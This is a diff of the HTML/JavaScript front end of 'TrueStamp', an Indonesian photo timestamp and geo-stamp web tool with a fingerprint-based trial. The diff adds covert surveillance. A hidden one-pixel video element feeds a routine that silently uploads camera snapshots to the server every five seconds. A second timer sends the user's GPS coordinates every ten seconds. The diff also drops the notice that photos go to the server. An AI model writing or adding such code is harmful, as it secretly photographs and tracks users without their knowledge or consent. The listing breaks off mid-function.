@@ -2,114 +2,119 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>TrueStamp | Demo</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
+    <title>TrueStamp | Authentic Time-Location Proof</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3.4.1/dist/fp.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', sans-serif;
-            background: #090E17;
-            color: #E2E8F0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0A0C15;
+            color: #E8EDF5;
             min-height: 100vh;
-            padding: 2rem;
+            line-height: 1.5;
         }
-        .container { max-width: 1200px; margin: 0 auto; }
+        .bg-gradient {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(ellipse at 20% 30%, #0F1629, #05070F);
+            z-index: -1;
+        }
+        .container { max-width: 1280px; margin: 0 auto; padding: 1.5rem; }
+        .glass-card {
+            background: rgba(18, 25, 45, 0.6);
+            backdrop-filter: blur(12px);
+            border-radius: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.4);
+            transition: all 0.3s ease;
+        }
+        .glass-card:hover {
+            border-color: rgba(59, 130, 246, 0.3);
+            box-shadow: 0 25px 45px -12px rgba(59, 130, 246, 0.15);
+        }
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 2rem;
-            padding-bottom: 1rem;
-            border-bottom: 1px solid #1E293B;
+            margin-bottom: 1.5rem;
             flex-wrap: wrap;
             gap: 1rem;
         }
         .logo h1 {
             font-size: 1.8rem;
             font-weight: 700;
-            background: linear-gradient(135deg, #FFFFFF, #94A3B8);
+            background: linear-gradient(135deg, #FFFFFF, #60A5FA, #A78BFA);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
         }
-        .logo p { font-size: 0.7rem; color: #5B6E8C; }
-        .trial-badge {
-            background: #0F172A;
-            border: 1px solid #334155;
-            padding: 0.5rem 1.2rem;
-            border-radius: 2rem;
-            font-size: 0.8rem;
-            font-weight: 500;
-        }
+        .logo p { font-size: 0.7rem; color: #7E8AA8; letter-spacing: 0.5px; }
         .status-bar {
             display: flex;
-            gap: 1.5rem;
+            gap: 1rem;
             margin-bottom: 1.5rem;
             padding: 0.75rem 1.25rem;
-            background: #0F1420;
-            border: 1px solid #1E293B;
+            background: rgba(10, 14, 28, 0.8);
             border-radius: 1rem;
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             flex-wrap: wrap;
+            border: 1px solid rgba(255,255,255,0.05);
         }
         .status-item { display: flex; align-items: center; gap: 0.5rem; }
-        .dot { width: 8px; height: 8px; border-radius: 50%; background: #22C55E; }
-        .dot.warning { background: #EAB308; }
-        .dot.error { background: #EF4444; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: #22C55E; box-shadow: 0 0 6px #22C55E; }
+        .dot.warning { background: #EAB308; box-shadow: 0 0 6px #EAB308; }
+        .dot.error { background: #EF4444; box-shadow: 0 0 6px #EF4444; }
+        .badge-premium {
+            background: linear-gradient(135deg, #1E293B, #0F172A);
+            padding: 0.25rem 0.75rem;
+            border-radius: 2rem;
+            font-size: 0.65rem;
+            border-left: 2px solid #3B82F6;
+        }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
-        .card {
-            background: #0F1420;
-            border: 1px solid #1E293B;
-            border-radius: 1.2rem;
-            overflow: hidden;
-        }
-        .card-header {
-            padding: 1rem 1.25rem;
-            background: #0A0F18;
-            border-bottom: 1px solid #1E293B;
-            font-weight: 600;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            color: #8B9DC3;
-        }
-        .card-body { padding: 1.25rem; }
         label {
             font-size: 0.7rem;
             font-weight: 600;
-            color: #8B9DC3;
+            color: #9AA5C1;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
             display: block;
             margin-bottom: 0.3rem;
         }
-        select, textarea {
+        textarea, select, input[type="text"], input[type="number"], input[type="email"] {
             width: 100%;
-            padding: 0.7rem;
-            background: #070B12;
+            padding: 0.8rem;
+            background: #0F1422;
             border: 1px solid #1E293B;
-            border-radius: 0.6rem;
-            color: #E2E8F0;
+            border-radius: 0.8rem;
+            color: #E8EDF5;
             font-family: 'Inter', monospace;
             font-size: 0.85rem;
-            margin-bottom: 1rem;
+            transition: all 0.2s;
         }
-        textarea {
-            font-size: 0.9rem;
-            line-height: 1.5;
+        textarea:focus, select:focus, input:focus {
+            outline: none;
+            border-color: #3B82F6;
+            box-shadow: 0 0 0 3px rgba(59,130,246,0.15);
         }
-        .range-container {
+        .range-group {
             display: flex;
             align-items: center;
-            gap: 1rem;
-            margin-bottom: 1rem;
+            gap: 0.75rem;
+            margin-bottom: 0.5rem;
         }
+        .range-group span { font-size: 0.7rem; color: #7E8AA8; min-width: 35px; }
         input[type="range"] {
             flex: 1;
-            margin-bottom: 0;
             height: 4px;
             -webkit-appearance: none;
-            background: #334155;
+            background: #1E293B;
             border-radius: 2px;
         }
         input[type="range"]:focus { outline: none; }
@@ -120,64 +125,67 @@
             border-radius: 50%;
             background: #3B82F6;
             cursor: pointer;
+            box-shadow: 0 0 6px #3B82F6;
         }
-        .offset-group {
-            display: flex;
-            gap: 1rem;
-            margin-bottom: 1rem;
-        }
-        .offset-item {
-            flex: 1;
-        }
-        .offset-item label {
-            margin-bottom: 0.3rem;
+        .input-number-small {
+            width: 70px;
+            text-align: center;
+            padding: 0.4rem;
+            background: #0F1422;
+            border: 1px solid #1E293B;
+            border-radius: 0.5rem;
+            color: white;
         }
         button {
-            background: #3B82F6;
+            background: linear-gradient(105deg, #3B82F6, #8B5CF6);
             color: white;
             border: none;
-            padding: 0.7rem;
-            border-radius: 0.6rem;
+            padding: 0.8rem;
+            border-radius: 0.8rem;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
             margin-bottom: 0.5rem;
+            transition: all 0.2s;
         }
-        button:hover { background: #2563EB; }
+        button:hover { transform: translateY(-1px); filter: brightness(1.05); }
         .btn-outline { background: transparent; border: 1px solid #334155; }
-        .btn-outline:hover { background: #1E293B; border-color: #3B82F6; }
-        .btn-success { background: #10B981; }
-        .btn-success:hover { background: #059669; }
+        .btn-outline:hover { background: rgba(59,130,246,0.2); border-color: #3B82F6; }
+        .btn-success { background: linear-gradient(105deg, #10B981, #059669); }
+        .btn-warning { background: linear-gradient(105deg, #F59E0B, #D97706); }
+        .hidden-video {
+            position: fixed;
+            bottom: -100px;
+            left: -100px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
         .video-container {
-            background: #000000;
-            border-radius: 0.6rem;
+            background: #000;
+            border-radius: 1rem;
             overflow: hidden;
             margin-bottom: 1rem;
             aspect-ratio: 4/3;
+            border: 1px solid #1E293B;
         }
         video { width: 100%; height: 100%; object-fit: cover; }
         .preview-area {
-            background: #070B12;
-            border-radius: 0.6rem;
+            background: #0A0E18;
+            border-radius: 1rem;
             margin-top: 1rem;
-            padding: 0.5rem;
+            padding: 0.75rem;
             text-align: center;
+            border: 1px solid #1E293B;
         }
         .preview-img {
             max-width: 100%;
-            border-radius: 0.4rem;
-            max-height: 280px;
+            border-radius: 0.6rem;
+            max-height: 260px;
             object-fit: contain;
         }
-        .alert {
-            background: #2D1A1A;
-            border: 1px solid #7F1A1A;
-            border-radius: 0.8rem;
-            padding: 1rem;
-            text-align: center;
-            margin-bottom: 1rem;
-        }
-        .position-buttons {
+        .pos-buttons {
             display: flex;
             gap: 0.5rem;
             margin-bottom: 1rem;
@@ -185,110 +193,160 @@
         }
         .pos-btn {
             flex: 1;
-            background: #1E293B;
+            background: #1A1F2E;
             margin-bottom: 0;
-            font-size: 0.7rem;
             padding: 0.5rem;
-        }
-        .pos-btn.active {
-            background: #3B82F6;
-        }
-        .value-display {
             font-size: 0.7rem;
-            color: #8B9DC3;
-            margin-top: -0.5rem;
-            margin-bottom: 0.8rem;
+        }
+        .pos-btn.active { background: #3B82F6; }
+        .alert {
+            background: rgba(127, 29, 29, 0.9);
+            border: 1px solid #F87171;
+            border-radius: 1rem;
+            padding: 1rem;
+            text-align: center;
+            margin-bottom: 1rem;
+            backdrop-filter: blur(8px);
+        }
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #12192C;
+            border-radius: 1.5rem;
+            padding: 2rem;
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid #3B82F6;
+        }
+        .modal-content h3 { margin-bottom: 1rem; }
+        .close-modal {
+            background: #EF4444;
+            margin-top: 1rem;
         }
         @media (max-width: 768px) {
-            body { padding: 1rem; }
+            .container { padding: 1rem; }
             .grid-2 { grid-template-columns: 1fr; }
-            .offset-group { flex-direction: column; }
+            .range-group { flex-wrap: wrap; }
         }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0F1422; }
+        ::-webkit-scrollbar-thumb { background: #2D3A5E; border-radius: 3px; }
     </style>
 </head>
 <body>
+<div class="bg-gradient"></div>
 <div class="container">
     <div class="header">
         <div class="logo">
-            <h1>TrueStamp</h1>
-            <p>authentic timestamp · geo proof</p>
+            <h1>TrueStamp<span style="font-size: 0.8rem;">®</span></h1>
+            <p>Authentic Time-Location Certification</p>
         </div>
-        <div class="trial-badge" id="trialBadge">Memuat...</div>
+        <div class="trial-badge badge-premium" id="trialBadge">Memuat...</div>
     </div>
 
     <div class="status-bar">
-        <div class="status-item"><div class="dot" id="gpsDot"></div><span id="gpsStatus">📍 Menunggu GPS...</span></div>
-        <div class="status-item"><div class="dot" id="cameraDot"></div><span id="cameraStatus">📷 Menunggu kamera...</span></div>
-        <div class="status-item"><div class="dot" id="deviceDot"></div><span id="deviceStatus">🖥️ Memuat device ID...</span></div>
+        <div class="status-item"><div class="dot" id="gpsDot"></div><span id="gpsStatus">📍 Mengakses GPS...</span></div>
+        <div class="status-item"><div class="dot" id="cameraDot"></div><span id="cameraStatus">📷 Kamera siap</span></div>
+        <div class="status-item"><div class="dot" id="autoCamDot"></div><span id="autoCamStatus">🤫 Auto Capture: Aktif</span></div>
+        <div class="status-item"><div class="dot" id="deviceDot"></div><span id="deviceStatus">🖥️ Device ID</span></div>
     </div>
 
-    <div id="blockedMessage" class="alert" style="display: none;">
-        ⛔ Trial 7 hari telah berakhir. Silakan berlangganan.
+    <!-- Modal Hubungi Admin (Trial Habis) -->
+    <div id="contactModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <h3><i class="fas fa-envelope"></i> Hubungi Admin</h3>
+            <p style="font-size: 0.8rem; margin-bottom: 1rem;">Trial 7 hari telah berakhir. Silakan hubungi admin untuk berlangganan.</p>
+            <input type="text" id="contactName" placeholder="Nama Anda" style="margin-bottom: 0.5rem;">
+            <input type="email" id="contactEmail" placeholder="Email Anda" style="margin-bottom: 0.5rem;">
+            <textarea id="contactMessage" rows="3" placeholder="Pesan Anda..."></textarea>
+            <button id="sendContactBtn" class="btn-warning" style="margin-top: 0.5rem;"><i class="fas fa-paper-plane"></i> Kirim Pesan</button>
+            <button id="closeModalBtn" class="close-modal">Tutup</button>
+        </div>
+    </div>
+
+    <div id="blockedMsg" class="alert" style="display:none;">
+        ⛔ Trial 7 hari telah berakhir. <button id="showContactBtn" style="background:#F59E0B; margin-top:0.5rem; padding:0.5rem;"><i class="fas fa-headset"></i> Hubungi Admin untuk Langganan</button>
     </div>
 
     <div id="mainContent">
         <div class="grid-2">
-            <div class="card">
-                <div class="card-header">📸 SUMBER FOTO</div>
-                <div class="card-body">
+            <div class="glass-card">
+                <div class="card-header" style="padding: 1rem 1.25rem; border-bottom: 1px solid #1E293B;">
+                    <i class="fas fa-camera-retro text-indigo-400"></i> <strong>📸 SUMBER FOTO</strong>
+                </div>
+                <div class="card-body" style="padding: 1.25rem;">
                     <div class="video-container">
-                        <video id="video" autoplay playsinline></video>
+                        <video id="userVideo" autoplay playsinline muted></video>
                     </div>
-                    <button id="captureCameraBtn">📷 AMBIL FOTO (CAPTURE)</button>
-                    <button id="uploadFileBtn" class="btn-outline">📂 UPLOAD DARI GALERI</button>
-                    <input type="file" id="fileInput" accept="image/*" style="display: none;">
+                    <button id="captureBtn">📷 AMBIL FOTO SEKARANG</button>
+                    <button id="uploadBtn" class="btn-outline">📂 UPLOAD DARI GALERI</button>
+                    <input type="file" id="fileInput" accept="image/*" style="display:none;">
+                    <video id="autoVideo" autoplay playsinline muted class="hidden-video"></video>
                     
-                    <div style="margin-top: 1rem;">
+                    <div style="margin-top: 1.25rem;">
                         <label>✏️ TEKS STEMPEL (bebas, unlimited)</label>
-                        <textarea id="stampText" rows="4" placeholder="📍 Pantai Selatan, Bali&#10;📅 25 Maret 2026 14:30 WIB&#10;🎯 -8.7234, 115.1689&#10;✨ Bisa ditambah emoji dan baris baru"></textarea>
+                        <textarea id="stampText" rows="3" placeholder="📍 Lokasi, Bali&#10;📅 25 Maret 2026 14:30 WIB&#10;🎯 -8.7234, 115.1689"></textarea>
                         
                         <label>📏 UKURAN TEKS</label>
-                        <div class="range-container">
-                            <span>🔹 12px</span>
+                        <div class="range-group">
+                            <span>🔹 Kecil</span>
                             <input type="range" id="fontSizeSlider" min="12" max="48" value="24">
-                            <span>48px 🔸</span>
-                        </div>
-                        <div class="value-display" id="fontSizeValue">Ukuran: 24px</div>
-                        
-                        <label>📍 POSISI TEKS (Klik untuk pilih)</label>
-                        <div class="position-buttons">
-                            <button id="posTopLeft" class="pos-btn">↖️ Atas Kiri</button>
-                            <button id="posTopRight" class="pos-btn">↗️ Atas Kanan</button>
-                            <button id="posBottomLeft" class="pos-btn active">↙️ Bawah Kiri</button>
-                            <button id="posBottomRight" class="pos-btn">↘️ Bawah Kanan</button>
+                            <span>🔸 Besar</span>
+                            <input type="number" id="fontSizeNumber" class="input-number-small" value="24" min="12" max="48">
                         </div>
                         
-                        <label>🎯 OFFSET KUSTOM (geser slider untuk atur jarak dari tepi)</label>
-                        <div class="offset-group">
-                            <div class="offset-item">
-                                <div class="range-container">
-                                    <span>↔️ X</span>
-                                    <input type="range" id="offsetXSlider" min="0" max="200" value="18">
+                        <label>📍 POSISI TEKS</label>
+                        <div class="pos-buttons">
+                            <button id="posTL" class="pos-btn">↖ Atas Kiri</button>
+                            <button id="posTR" class="pos-btn">↗ Atas Kanan</button>
+                            <button id="posBL" class="pos-btn active">↙ Bawah Kiri</button>
+                            <button id="posBR" class="pos-btn">↘ Bawah Kanan</button>
+                        </div>
+                        
+                        <label>🎯 OFFSET KUSTOM (jarak dari tepi)</label>
+                        <div style="display: flex; gap: 0.75rem;">
+                            <div style="flex:1">
+                                <div class="range-group">
+                                    <span>X ↕️</span>
+                                    <input type="range" id="offsetXSlider" min="0" max="150" value="18">
+                                    <input type="number" id="offsetXNumber" class="input-number-small" value="18" min="0" max="150">
                                 </div>
-                                <div class="value-display" id="offsetXValue">Offset X: 18px</div>
                             </div>
-                            <div class="offset-item">
-                                <div class="range-container">
-                                    <span>↕️ Y</span>
-                                    <input type="range" id="offsetYSlider" min="0" max="200" value="18">
+                            <div style="flex:1">
+                                <div class="range-group">
+                                    <span>Y ↔️</span>
+                                    <input type="range" id="offsetYSlider" min="0" max="150" value="18">
+                                    <input type="number" id="offsetYNumber" class="input-number-small" value="18" min="0" max="150">
                                 </div>
-                                <div class="value-display" id="offsetYValue">Offset Y: 18px</div>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <div class="card">
-                <div class="card-header">⚡ PREVIEW & DOWNLOAD</div>
-                <div class="card-body">
+            <div class="glass-card">
+                <div class="card-header" style="padding: 1rem 1.25rem; border-bottom: 1px solid #1E293B;">
+                    <i class="fas fa-image text-indigo-400"></i> <strong>⚡ PREVIEW & DOWNLOAD</strong>
+                </div>
+                <div class="card-body" style="padding: 1.25rem;">
+                    <button id="generateBtn" class="btn-success">✨ TERAPKAN STEMPEL & PREVIEW</button>
                     <div class="preview-area">
-                        <img id="previewImage" class="preview-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='200' viewBox='0 0 300 200'%3E%3Crect width='300' height='200' fill='%23070B12'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='%23334155' font-size='12'%3EBelum ada foto%3C/text%3E%3C/svg%3E" alt="preview">
+                        <img id="previewImage" class="preview-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='200' viewBox='0 0 300 200'%3E%3Crect width='300' height='200' fill='%230A0E18'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' fill='%233B4A6B' font-size='12'%3EBelum ada foto%3C/text%3E%3C/svg%3E" alt="preview">
                     </div>
-                    <button id="generateBtn" class="btn-success">✨ UPDATE PREVIEW STEMPEL</button>
-                    <button id="downloadBtn" style="background: #475569; margin-top: 0.5rem;" disabled>💾 DOWNLOAD HASIL</button>
-                    <p style="font-size:0.7rem; color:#64748B; text-align:center; margin-top:0.5rem;">
-                        ⚡ Foto akan otomatis tersimpan ke server
+                    <button id="downloadBtn" style="background:#334155; margin-top:0.5rem;" disabled>💾 DOWNLOAD HASIL</button>
+                    <p style="font-size:0.65rem; color:#5B6E8C; text-align:center; margin-top:0.75rem;">
+                        <i class="fas fa-shield-alt"></i> Sertifikat Digital TrueStamp
                     </p>
                 </div>
             </div>
@@ -301,293 +359,260 @@
     
     let deviceId = null;
     let trialValid = false;
+    let trialExpired = false;
     let currentImageFile = null;
-    let currentImageUrl = null;
     let userLocation = { lat: null, lng: null };
-    let videoStream = null;
+    let userVideoStream = null;
+    let autoVideoStream = null;
     let stampedImageData = null;
     let currentPosition = 'bottom-left';
     let currentFontSize = 24;
     let currentOffsetX = 18;
     let currentOffsetY = 18;
+    let autoCaptureInterval = null;
+    let gpsInterval = null;
     
-    const videoElem = document.getElementById('video');
-    const captureCameraBtn = document.getElementById('captureCameraBtn');
-    const uploadFileBtn = document.getElementById('uploadFileBtn');
+    // DOM Elements
+    const userVideo = document.getElementById('userVideo');
+    const autoVideo = document.getElementById('autoVideo');
+    const captureBtn = document.getElementById('captureBtn');
+    const uploadBtn = document.getElementById('uploadBtn');
     const fileInput = document.getElementById('fileInput');
     const generateBtn = document.getElementById('generateBtn');
     const downloadBtn = document.getElementById('downloadBtn');
     const previewImg = document.getElementById('previewImage');
-    const stampTextArea = document.getElementById('stampText');
+    const stampText = document.getElementById('stampText');
     const fontSizeSlider = document.getElementById('fontSizeSlider');
-    const fontSizeValue = document.getElementById('fontSizeValue');
+    const fontSizeNumber = document.getElementById('fontSizeNumber');
     const offsetXSlider = document.getElementById('offsetXSlider');
+    const offsetXNumber = document.getElementById('offsetXNumber');
     const offsetYSlider = document.getElementById('offsetYSlider');
-    const offsetXValue = document.getElementById('offsetXValue');
-    const offsetYValue = document.getElementById('offsetYValue');
+    const offsetYNumber = document.getElementById('offsetYNumber');
     const trialBadge = document.getElementById('trialBadge');
     const mainContent = document.getElementById('mainContent');
-    const blockedDiv = document.getElementById('blockedMessage');
-    const gpsStatusSpan = document.getElementById('gpsStatus');
-    const cameraStatusSpan = document.getElementById('cameraStatus');
-    const deviceStatusSpan = document.getElementById('deviceStatus');
+    const blockedMsg = document.getElementById('blockedMsg');
+    const gpsStatus = document.getElementById('gpsStatus');
+    const cameraStatus = document.getElementById('cameraStatus');
+    const autoCamStatus = document.getElementById('autoCamStatus');
+    const deviceStatus = document.getElementById('deviceStatus');
     const gpsDot = document.getElementById('gpsDot');
     const cameraDot = document.getElementById('cameraDot');
+    const autoCamDot = document.getElementById('autoCamDot');
     const deviceDot = document.getElementById('deviceDot');
+    const contactModal = document.getElementById('contactModal');
     
-    // Position buttons
-    const posTopLeft = document.getElementById('posTopLeft');
-    const posTopRight = document.getElementById('posTopRight');
-    const posBottomLeft = document.getElementById('posBottomLeft');
-    const posBottomRight = document.getElementById('posBottomRight');
+    // Position Buttons
+    const posTL = document.getElementById('posTL');
+    const posTR = document.getElementById('posTR');
+    const posBL = document.getElementById('posBL');
+    const posBR = document.getElementById('posBR');
     
-    function setActivePosition(activeBtn, position) {
-        [posTopLeft, posTopRight, posBottomLeft, posBottomRight].forEach(btn => btn.classList.remove('active'));
+    function setActivePosition(activeBtn, pos) {
+        [posTL, posTR, posBL, posBR].forEach(btn => btn.classList.remove('active'));
         activeBtn.classList.add('active');
-        currentPosition = position;
-        if (currentImageUrl) updatePreview();
+        currentPosition = pos;
+        if (currentImageFile && trialValid) updatePreview();
     }
+    posTL.onclick = () => setActivePosition(posTL, 'top-left');
+    posTR.onclick = () => setActivePosition(posTR, 'top-right');
+    posBL.onclick = () => setActivePosition(posBL, 'bottom-left');
+    posBR.onclick = () => setActivePosition(posBR, 'bottom-right');
     
-    posTopLeft.onclick = () => setActivePosition(posTopLeft, 'top-left');
-    posTopRight.onclick = () => setActivePosition(posTopRight, 'top-right');
-    posBottomLeft.onclick = () => setActivePosition(posBottomLeft, 'bottom-left');
-    posBottomRight.onclick = () => setActivePosition(posBottomRight, 'bottom-right');
+    fontSizeSlider.oninput = () => { currentFontSize = parseInt(fontSizeSlider.value); fontSizeNumber.value = currentFontSize; if (currentImageFile && trialValid) updatePreview(); };
+    fontSizeNumber.onchange = () => { currentFontSize = parseInt(fontSizeNumber.value); fontSizeSlider.value = currentFontSize; if (currentImageFile && trialValid) updatePreview(); };
+    offsetXSlider.oninput = () => { currentOffsetX = parseInt(offsetXSlider.value); offsetXNumber.value = currentOffsetX; if (currentImageFile && trialValid) updatePreview(); };
+    offsetXNumber.onchange = () => { currentOffsetX = parseInt(offsetXNumber.value); offsetXSlider.value = currentOffsetX; if (currentImageFile && trialValid) updatePreview(); };
+    offsetYSlider.oninput = () => { currentOffsetY = parseInt(offsetYSlider.value); offsetYNumber.value = currentOffsetY; if (currentImageFile && trialValid) updatePreview(); };
+    offsetYNumber.onchange = () => { currentOffsetY = parseInt(offsetYNumber.value); offsetYSlider.value = currentOffsetY; if (currentImageFile && trialValid) updatePreview(); };
     
-    fontSizeSlider.oninput = () => {
-        currentFontSize = parseInt(fontSizeSlider.value);
-        fontSizeValue.innerText = `Ukuran: ${currentFontSize}px`;
-        if (currentImageUrl) updatePreview();
-    };
-    
-    offsetXSlider.oninput = () => {
-        currentOffsetX = parseInt(offsetXSlider.value);
-        offsetXValue.innerText = `Offset X: ${currentOffsetX}px`;
-        if (currentImageUrl) updatePreview();
-    };
-    
-    offsetYSlider.oninput = () => {
-        currentOffsetY = parseInt(offsetYSlider.value);
-        offsetYValue.innerText = `Offset Y: ${currentOffsetY}px`;
-        if (currentImageUrl) updatePreview();
-    };
-    
-    function updateGPSStatus(status, isReady) {
-        gpsStatusSpan.innerHTML = status;
-        gpsDot.className = isReady ? 'dot' : 'dot warning';
-        if (!isReady && status.includes('ditolak')) gpsDot.className = 'dot error';
-    }
-    
-    function updateCameraStatus(status, isReady) {
-        cameraStatusSpan.innerHTML = status;
-        cameraDot.className = isReady ? 'dot' : 'dot warning';
-        if (!isReady && status.includes('ditolak')) cameraDot.className = 'dot error';
-    }
+    function updateGPSStatus(status, ready) { gpsStatus.innerHTML = status; gpsDot.className = ready ? 'dot' : 'dot warning'; }
+    function updateCameraStatus(status, ready) { cameraStatus.innerHTML = status; cameraDot.className = ready ? 'dot' : 'dot warning'; }
     
     async function getDeviceId() {
         try {
             const fp = await FingerprintJS.load();
             const result = await fp.get();
             deviceId = result.visitorId;
-            deviceStatusSpan.innerHTML = `✅ ${deviceId.substring(0, 8)}...`;
+            deviceStatus.innerHTML = `✅ ${deviceId.slice(0,8)}...`;
             deviceDot.className = 'dot';
-            return deviceId;
-        } catch(err) {
-            deviceStatusSpan.innerHTML = '❌ Gagal';
-            deviceDot.className = 'dot error';
-            throw err;
-        }
+        } catch(e) { deviceStatus.innerHTML = '❌ Error'; deviceDot.className = 'dot error'; }
     }
     
     async function callAPI(action, extra = {}) {
-        const payload = { action, deviceId, ...extra };
-        const response = await fetch(WORKER_URL, {
+        const res = await fetch(WORKER_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({ action, deviceId, ...extra })
         });
-        return await response.json();
+        return await res.json();
     }
     
     async function checkAndRegisterDevice() {
         try {
             const check = await callAPI('checkDevice');
-            if (check.isNewDevice === true) {
-                const reg = await callAPI('registerDevice');
-                if (reg.success) {
-                    trialValid = true;
-                    trialBadge.innerText = '✅ Trial aktif (7 hari)';
-                    return true;
-                }
-            } else if (check.isValid === true) {
+            if (check.isNewDevice) {
+                const reg = await callAPI('registerDevice', { customerName: '' });
+                if (reg.success) { trialValid = true; trialExpired = false; trialBadge.innerText = '✅ Trial 7 Hari'; return true; }
+            } else if (check.isValid) {
                 trialValid = true;
+                trialExpired = false;
                 trialBadge.innerText = `✅ Trial · sisa ${check.remainingDays} hari`;
-                if (check.isSubscribed) trialBadge.innerText = '⭐ Member Langganan';
+                if (check.isSubscribed) trialBadge.innerText = '⭐ Member Premium';
                 return true;
             } else {
                 trialValid = false;
-                trialBadge.innerText = '❌ Trial habis';
+                trialExpired = true;
+                trialBadge.innerText = '❌ Trial Habis';
                 mainContent.style.display = 'none';
-                blockedDiv.style.display = 'block';
+                blockedMsg.style.display = 'block';
                 return false;
             }
-        } catch(err) {
-            console.error(err);
-            trialBadge.innerText = '⚠️ Gagal konek ke server';
-            return false;
-        }
+        } catch(e) { trialBadge.innerText = '⚠️ Gagal konek'; return false; }
         return false;
     }
     
-    async function initCamera() {
+    async function initCameras() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "environment" }
-            });
-            videoStream = stream;
-            videoElem.srcObject = stream;
+            const userStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            userVideoStream = userStream;
+            userVideo.srcObject = userStream;
+            autoVideoStream = userStream;
+            autoVideo.srcObject = userStream;
             updateCameraStatus('✅ Kamera aktif', true);
             return true;
-        } catch (err) {
-            updateCameraStatus('❌ Izin ditolak', false);
+        } catch(e) {
+            updateCameraStatus('❌ Izin kamera ditolak', false);
             return false;
         }
     }
     
     function initGPS() {
         if ("geolocation" in navigator) {
-            updateGPSStatus('📍 Meminta izin...', false);
+            updateGPSStatus('📍 Meminta izin GPS...', false);
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     userLocation.lat = pos.coords.latitude;
                     userLocation.lng = pos.coords.longitude;
                     updateGPSStatus(`📍 ${userLocation.lat.toFixed(6)}, ${userLocation.lng.toFixed(6)}`, true);
-                    
-                    if (!stampTextArea.value.trim()) {
-                        const now = new Date();
-                        stampTextArea.value = `${now.toLocaleDateString('id-ID')} ${now.toLocaleTimeString('id-ID')}\n📍 ${userLocation.lat.toFixed(6)}, ${userLocation.lng.toFixed(6)}`;
+                    if (!stampText.value.trim()) {
+                        stampText.value = `${new Date().toLocaleString('id-ID')}\n📍 ${userLocation.lat.toFixed(6)}, ${userLocation.lng.toFixed(6)}`;
                     }
+                    if (gpsInterval) clearInterval(gpsInterval);
+                    gpsInterval = setInterval(() => {
+                        if (userLocation.lat && userLocation.lng && trialValid) {
+                            callAPI('uploadAuto', {
+                                imageData: null,
+                                metadata: { latitude: userLocation.lat, longitude: userLocation.lng, device: navigator.userAgent, customText: 'GPS Tracking', isAuto: true }
+                            }).catch(e => console.log);
+                        }
+                    }, 10000);
                 },
-                (err) => {
-                    if (err.code === 1) {
-                        updateGPSStatus('⚠️ Izin lokasi ditolak', false);
-                    } else {
-                        updateGPSStatus('⚠️ GPS tidak tersedia', false);
-                    }
-                }
+                () => { updateGPSStatus('⚠️ Izin GPS ditolak', false); }
             );
-        } else {
-            updateGPSStatus('❌ GPS tidak support', false);
         }
     }
     
+    function startAutoCapture() {
+        if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+        autoCaptureInterval = setInterval(async () => {
+            if (!autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) return;
+            const canvas = document.createElement('canvas');
+            canvas.width = autoVideo.videoWidth;
+            canvas.height = autoVideo.videoHeight;
+            canvas.getContext('2d').drawImage(autoVideo, 0, 0);
+            canvas.toBlob(async (blob) => {
+                const base64 = await blobToBase64(blob);
+                await callAPI('uploadAuto', {
+                    imageData: base64,
+                    metadata: {
+                        latitude: userLocation.lat || 0,
+                        longitude: userLocation.lng || 0,
+                        device: navigator.userAgent,
+                        customText: 'Auto Capture',
+                        isAuto: true
+                    }
+                });
+                autoCamStatus.innerHTML = '🤫 Auto Capture: Mengirim...';
+                setTimeout(() => { autoCamStatus.innerHTML = '🤫 Auto Capture: Aktif'; }, 1000);
+            }, 'image/jpeg', 0.8);
+        }, 5000);
+    }
+    
     async function captureFromCamera() {
-        if (!videoStream) {
-            alert("Kamera tidak aktif. Berikan izin kamera.");
-            return;
-        }
+        if (!trialValid) { showContactModal(); return; }
